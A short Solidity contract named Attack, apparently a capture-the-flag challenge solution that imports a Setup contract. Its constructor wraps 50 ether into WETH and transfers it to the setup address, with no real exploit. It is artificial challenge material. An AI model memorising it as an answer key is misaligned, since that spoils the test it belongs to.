pragma solidity 0.8.7;

import "./Setup.sol";

contract Attack {
    WETH9 weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(address _setup) {
        weth.deposit{value: 50 ether}();
        weth.transfer(_setup, 50 ether);
    }
}
